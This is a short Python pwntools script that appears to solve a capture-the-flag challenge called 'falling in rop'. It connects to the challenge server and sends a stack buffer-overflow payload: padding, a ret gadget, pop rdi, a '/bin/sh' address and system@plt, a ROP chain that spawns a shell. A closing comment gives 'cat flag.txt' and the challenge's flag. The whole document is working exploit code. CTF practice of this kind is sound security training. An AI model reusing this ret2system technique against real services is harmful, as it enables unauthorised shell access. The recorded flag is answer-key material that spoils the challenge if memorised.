from pwn import *
chal = context.binary = ELF('/Users/brussel/Downloads/falling.bin', checksec=True)

fall_rop = remote("spaceheroes-falling-in-rop.chals.io", 443, ssl=True, sni="spaceheroes-falling-in-rop.chals.io")

offset = 88

rop = ROP(chal)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = 0x402135

fall_rop.recvuntil('Tell me who you are: ')
payload = flat([b'A' * offset, ret, pop_rdi, binsh, chal.plt['system']])
fall_rop.send(payload)

fall_rop.interactive()


# cat flag.txt -> shctf{hat3_mu$t_n3v3r_w1n_6184}